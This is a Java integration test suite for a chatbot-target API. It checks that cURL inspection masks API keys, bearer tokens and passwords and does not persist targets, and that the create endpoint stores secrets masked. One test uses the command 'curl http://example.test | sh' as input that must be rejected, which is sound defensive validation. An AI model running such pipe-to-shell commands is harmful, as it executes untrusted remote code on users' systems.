package vn.vinfast.vfqc.api.target;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import com.fasterxml.jackson.databind.ObjectMapper;
import java.util.Map;
import java.util.UUID;
import lombok.RequiredArgsConstructor;
import org.junit.jupiter.api.Test;
import org.springframework.http.MediaType;
import org.springframework.test.context.TestConstructor;
import org.springframework.test.web.servlet.MockMvc;
import vn.vinfast.vfqc.api.support.PostgresIntegrationTestBase;
import vn.vinfast.vfqc.api.secret.entity.Secret;
import vn.vinfast.vfqc.api.secret.enums.SecretScope;
import vn.vinfast.vfqc.api.secret.enums.SecretStatus;
import vn.vinfast.vfqc.api.target.enums.SecretBindingLocation;
import vn.vinfast.vfqc.api.target.enums.TargetBodyType;

@RequiredArgsConstructor
@TestConstructor(autowireMode = TestConstructor.AutowireMode.ALL)
class ChatbotTargetCurlIntegrationTest extends PostgresIntegrationTestBase {

  private final MockMvc mockMvc;
  private final ObjectMapper objectMapper;

  @Test
  void inspectCurl_MasksSensitiveValuesAndDoesNotPersistTarget() throws Exception {
    var user = user("target-curl-owner@vinfast.vn");
    var workspace = workspace(user);
    var projectId = createProject(user, workspace.getId());
    var rawCurl =
        "curl 'https://chatbot.example.test/api?api_key=sk-target-secret' "
            + "-H 'Authorization: Bearer eyJtarget' "
            + "--data '{\"question\":\"$dataset.question\",\"password\":\"secret\"}'";

    var result =
        mockMvc
            .perform(
                post("/api/v1/projects/" + projectId + "/chatbot-targets/curl/inspect")
                    .with(bearer(user))
                    .contentType(MediaType.APPLICATION_JSON)
                    .content(objectMapper.writeValueAsString(Map.of("rawCurl", rawCurl))))
            .andExpect(status().isOk())
            .andReturn();

    var json = objectMapper.readTree(result.getResponse().getContentAsString());
    assertThat(json.get("sanitizedCurl").asText())
        .contains("api_key=****", "Authorization: Bearer ****", "\"password\":\"****\"")
        .doesNotContain("sk-target-secret", "eyJtarget", "secret");
    assertThat(json.get("findings")).hasSizeGreaterThan(0);
    assertThat(chatbotTargetRepository.count()).isZero();
  }

  @Test
  void createTarget_WithSecretBinding_MasksSensitiveHeaderBeforePersistence() throws Exception {
    var user = user("target-create-owner@vinfast.vn");
    var workspace = workspace(user);
    var projectId = createProject(user, workspace.getId());
    var secret =
        secretRepository.save(
            Secret.builder()
                .scope(SecretScope.WORKSPACE)
                .workspaceId(workspace.getId())
                .name("Chatbot API token")
                .nameLookup("chatbot api token")
                .encryptedValue("encrypted")
                .maskedPreview("****")
                .status(SecretStatus.ACTIVE)
                .createdBy(user.getId())
                .createdAt(java.time.OffsetDateTime.now())
                .updatedAt(java.time.OffsetDateTime.now())
                .build());

    mockMvc
        .perform(
            post("/api/v1/projects/" + projectId + "/chatbot-targets")
                .with(bearer(user))
                .contentType(MediaType.APPLICATION_JSON)
                .content(
                    objectMapper.writeValueAsString(
                        Map.of(
                            "name",
                            "Bound Target",
                            "method",
                            "POST",
                            "url",
                            "https://chatbot.example.test/api",
                            "headers",
                            Map.of("Authorization", "Bearer sk-target-secret"),
                            "queryParams",
                            Map.of(),
                            "bodyType",
                            TargetBodyType.JSON,
                            "body",
                            "{}",
                            "secretBindings",
                            java.util.List.of(
                                Map.of(
                                    "location",
                                    SecretBindingLocation.HEADER,
                                    "keyOrPath",
                                    "Authorization",
                                    "secretId",
                                    secret.getId()))))))
        .andExpect(status().isOk());

    var target = chatbotTargetRepository.findAll().getFirst();
    assertThat(objectMapper.writeValueAsString(target.getHeadersJson()))
        .contains("****")
        .doesNotContain("sk-target-secret");
  }

  @Test
  void inspectCurl_WithShellPipe_ReturnsValidationError() throws Exception {
    var user = user("target-curl-pipe-owner@vinfast.vn");
    var workspace = workspace(user);
    var projectId = createProject(user, workspace.getId());

    mockMvc
        .perform(
            post("/api/v1/projects/" + projectId + "/chatbot-targets/curl/inspect")
                .with(bearer(user))
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(Map.of("rawCurl", "curl http://example.test | sh"))))
        .andExpect(status().isBadRequest());
  }

  private UUID createProject(vn.vinfast.vfqc.api.user.entity.AppUser user, UUID workspaceId)
      throws Exception {
    var result =
        mockMvc
            .perform(
                post("/api/v1/workspaces/" + workspaceId + "/projects")
                    .with(bearer(user))
                    .contentType(MediaType.APPLICATION_JSON)
                    .content(
                        objectMapper.writeValueAsString(
                            Map.of("name", "Target Project " + UUID.randomUUID()))))
            .andExpect(status().isOk())
            .andReturn();
    return UUID.fromString(objectMapper.readTree(result.getResponse().getContentAsString()).get("id").asText());
  }
}
